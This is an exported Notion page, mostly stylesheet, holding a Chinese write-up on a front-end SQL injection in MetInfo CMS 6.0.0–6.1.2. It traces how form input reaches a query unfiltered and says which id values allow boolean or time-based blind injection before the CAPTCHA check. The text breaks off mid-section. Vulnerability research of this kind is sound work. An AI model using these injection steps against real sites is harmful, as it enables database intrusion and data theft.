@@ -1,0 +1,949 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>metinfo CMS系统漏洞合集 (php)</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="048b0f9b-0ac1-4165-8bbd-d551e4df3604" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://www.notion.so/icons/upload-document_gray.svg"/></div><h1 class="page-title">metinfo CMS系统漏洞合集 (php)</h1><p class="page-description"></p></header><div class="page-body"><h1 id="2f7dc70b-7218-4609-b85c-cc6b665741da" class="">一、相关基础</h1><h3 id="d42743b8-7b09-42b4-b1b1-7a65ec2a6152" class="">1-基础介绍</h3><p id="d5fdd4df-a2e7-4024-9391-ded29cf7ca3c" class="">metinfo 是一个由php、mysql组成的前端页面合集，开源的CMS系统。可以用来展示企业信息。</p><p id="ad87f656-94ff-4067-b7bb-43e057aa7f4f" class="">其提供的功能板块主要分为：<div class="indented"><p id="1e2c1fb9-d580-4715-a5d8-6037bbb2b51f" class="">1、展示型：包括企业简介模块、新闻模块、产品模块、招聘模块</p><p id="df51107d-f4e0-41d3-890e-d707d6982fef" class="">2、交流型：在线留言、反馈系统、在线交流。</p><p id="064f0547-f268-451d-bfb2-c693b5d70f9e" class="">3、用户管理型：会员与权限管理</p><p id="ad4664b1-64f7-4c90-8ebd-1373365c0981" class="">4、其他：下载模块、友情链接</p></div></p><p id="242621dc-5f78-4bc1-b375-62b11dea822e" class="">官网地址：<a href="https://www.metinfo.cn/">https://www.metinfo.cn/</a>。目前的最新版本是7.9。</p><h1 id="3bef0054-e365-4fe9-a54f-7eea0d7b9611" class="">二、漏洞介绍</h1><h3 id="f2495778-4726-42e3-b562-1592d7720981" class="">1-前台sql注入漏洞</h3><p id="a548f3aa-d75e-417b-aa98-f934382d9741" class=""><strong>【条件】</strong></p><p id="74834c0f-b607-4bb7-ae89-67ff981f5425" class="">版本6.0.0-6.1.2</p><p id="c8555309-2a40-468e-bc5b-392048311dcc" class=""><strong>【原理】</strong></p><p id="4fff919f-d805-4fe1-b064-89444b51b7d4" class="">漏洞存在于<strong>app\system\message\web\message.class.php</strong>文件中。</p><p id="93ad1b35-7740-4e8f-b0db-cdd1f30f021f" class="">想要触发这个SQL注入漏洞，我们可以通过前台的“在线留言”和“在线反馈”两个功能来触发。</p><ul id="9ce2ff8e-c05a-4670-a240-c3aafe9838a7" class="toggle"><li><details open=""><summary>在线留言处</summary><p id="d97effb1-c430-4ae9-bdc2-a2df408702f2" class="">1、前端提交<div class="indented"><p id="a07d4988-fd72-490c-be1d-4b625e8170b3" class="">以“在线留言”为例，是用表单提交一个如下的post请求：</p><figure id="7c6223b6-9722-4f18-af66-d00953f8b255" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled.png"><img style="width:432px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled.png"/></a></figure><p id="c70e88ad-a808-4795-9897-37c0ad247e57" class="">其中的id一行填入sql注入语句</p></div></p><p id="f1461995-c303-44c1-b400-efae9f3be9b4" class="">2、“在线留言”的后端代码，是获取变量{$_M[form][id]}，并进行sql注入过滤<div class="indented"><p id="561ccdea-83f5-40fc-b5ed-b143f897af45" class="">（1）首先是在<strong>common.class</strong>类的构造方法中，加载了表单，代码如下：<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d93f4a86-4600-4f27-a64b-8874963f0bf6" class="code"><code class="language-Plain Text">$this -&gt; load_form();</code></pre><blockquote id="f589abe0-064a-431c-b04e-6d1790f9c534" class="">此时this对象指向web类</blockquote></div></p><p id="55155cf8-f606-4ee3-b7cb-a49c1ebc0f86" class="">（2）我们跟进到<strong>web</strong>类的<strong>load_form</strong>方法(它对<strong>common</strong>基类的<strong>load_form</strong>方法做了重写)<div class="indented"><p id="61ebe82f-d3e7-462b-b330-c4fcaa3d1ba7" class="">代码逻辑为：</p><p id="8c91cbf7-19fd-4d9d-b962-4fb2c489b24b" class="">{1}来自基类的代码，用一个简单的<strong>daddslashes</strong>函数来对数据做简单消毒：<div class="indented"><figure id="9d84b0ac-8531-4c76-a14d-1e2ff730ca15" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%201.png"><img style="width:427.3333435058594px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%201.png"/></a></figure></div></p><p id="8990793d-ede8-41f2-aab7-4d0ae7303f65" class="">{2}将<strong>GET</strong>、<strong>POST</strong>、<strong>COOKIE</strong>获取的所有数据存放在<strong>$_M[&#x27;form&#x27;]</strong>中<div class="indented"><figure id="7e54dde0-90b9-4d73-b934-7bee6b3dc60a" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%202.png"><img style="width:403.3333435058594px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%202.png"/></a></figure></div></p><p id="e74ad5c9-b506-4420-8006-220b2ef9a81a" class="">{3}对$_M[&#x27;form&#x27;]中的所有数据进行了sqlinsert函数处理<div class="indented"><figure id="2330cea3-ffed-4b2b-9ee8-38fdc8a9d7b6" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%203.png"><img style="width:288px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%203.png"/></a></figure><p id="06ac1a73-22d0-4d2c-9d25-535e7c2a4844" class="">这里的处理还是比较简单的，过滤的函数太少了。可以打时间盲注的变种“benchmark时间盲注”，也可以直接打布尔注入</p></div></p><p id="3a3a9995-a59f-4e40-8021-48fe4a25d037" class="">{4}判断<strong>$_M[&#x27;form&#x27;][&#x27;id&#x27;]</strong>是否为数字，如果不是数字就直接设置为空字符串<div class="indented"><figure id="ea0142c4-8897-4753-92ff-1e082b19b823" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%204.png"><img style="width:657px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%204.png"/></a></figure><blockquote id="30243e09-b562-451c-acea-f87088a1d04a" class="">在这里，我们打的注入语句应该是变为空，无懈可击了<p id="a83dbdd5-6bf6-4d79-b454-f07baadd6ce7" class="">但是架不住后面有内鬼代码“神之一手”，来骗，来，偷袭！</p></blockquote></div></p><p id="e767b866-5f68-46f2-a5a6-d1669fa93ee4" class="">{5}内鬼代码，在上述代码执行完后，又执行到了一段“<strong>load::sys_class(&#x27;upfile&#x27;, &#x27;new&#x27;)</strong>”代码<div class="indented"><p id="77d44269-cae2-4711-9ebb-eff2b5249a93" class="">程序中加载的<strong>upfile</strong>类又重新载入了<strong>$_M[&#x27;form&#x27;]</strong>的值，而且并没有进行除了基类中<strong>daddslashes</strong>方法以外的消毒处理</p><p id="e1731aa4-0a78-4471-be15-2f289d1aa435" class="">呵呵，前面的检查白做了</p><blockquote id="04a58282-8bc7-46e6-a7fa-cbb2f4d48b2f" class="">在6.1.2版本代码中，程序员在daddslashes方法中加入了sqlinsert函数进行关键字处理<p id="d80c9f2f-d013-41d8-8be7-bdecd6f7d2a9" class="">但因为sqlinsert函数因为检验简单所以可以被轻松绕</p></blockquote></div></p></div></p></div></p><p id="683c3ab0-bb76-476a-a363-c79ec4c23dd4" class="">3、拼接sql语句，检查验证码<div class="indented"><p id="a901546b-7f6b-4ca4-a4da-c0aea1b543b0" class="">变量<strong>{$_M[form][id]}</strong> 直接拼接在<strong>SQL</strong>语句中，且验证码检测函数是在<strong>SQL</strong>语句查询之后，这也就造成了我们可以无视验证码检测函数，进行<strong>SQL</strong>注入。代码如下：</p><figure id="067d5b69-f27d-49e2-b746-13af513a2682" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%205.png"><img style="width:451.3333435058594px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%205.png"/></a></figure><p id="f7abb219-6d62-4a49-a4db-c60fa372d1c5" class="">并且可以看到——如果SQL语句查询结果中的<mark class="highlight-blue"><strong>value</strong></mark><mark class="highlight-blue">字段非空(读数据库源码可以得出当表单提交中的id=42或44时value字段非空)，则会进行验证码的检测，否则会直接返回“反馈已经被关闭”</mark>——也就是说，布尔盲注，启动！</p></div></p></details></li></ul><blockquote id="593b7297-067f-449e-8226-1f1ebde06e33" class="">↑总结就是：<p id="0ab28306-1f2b-4782-b13a-b272372d9f29" class="">即使在6.1.2版本代码中，也只用了sqlinsert函数对常见sql注入函数做了简单过滤，依然可以打布尔注入或者打时间盲注的变种“benchmark时间盲注”。</p><p id="4c9f1a19-c061-4dc9-ae72-1096db5ef5c8" class="">又因为如果SQL语句查询结果中的<mark class="highlight-blue"><strong>value</strong></mark><mark class="highlight-blue">字段非空(只需要使id=42或44，并成功执行sql语句即可)，则会进行验证码的检测，否则会直接返回“反馈已经被关闭”</mark>——布尔盲注，启动！(布尔注入时间短，必然优先考虑之)</p></blockquote><ul id="03f50c34-2aad-4a42-8e55-3e9094d7e6a0" class="toggle"><li><details open=""><summary>在线反馈处</summary><p id="3f0ab60a-47db-4031-93b7-19094dd3ae2f" class="">它会经过<strong>feedback</strong>类<strong>check_field</strong>方法，代码如下：<div class="indented"><figure id="d87aa688-5dd6-4fda-8354-b16da3c848ca" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%206.png"><img style="width:915px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%206.png"/></a><figcaption>进入这个黄框的if的条件是“当name为met_fd_class且value不为空时”</figcaption></figure><p id="83405285-87f0-4900-aa2a-aaded40cc764" class="">只要能进入这个黄框的if，估计就也可以打出布尔注入</p><p id="27bbf431-3274-453f-b39a-debcfe7dab4e" class="">通过读mysql数据库源码，可以得出当id取44或71时满足进去这个黄框if的条件——布尔，启动！</p></div></p><p id="d5e3ce5b-4452-49af-8e81-31127d0c025f" class="">然后就进入了feedback类的add方法<div class="indented"><p id="1f8d82ff-4914-4ce4-a216-cbbdbce2a1d5" class="">可以看到这里是先验证验证码再拼接sql语句，布尔，寄！开摆</p><figure id="67c79681-84cb-41db-ab5d-94b69539144a" class="image"><a 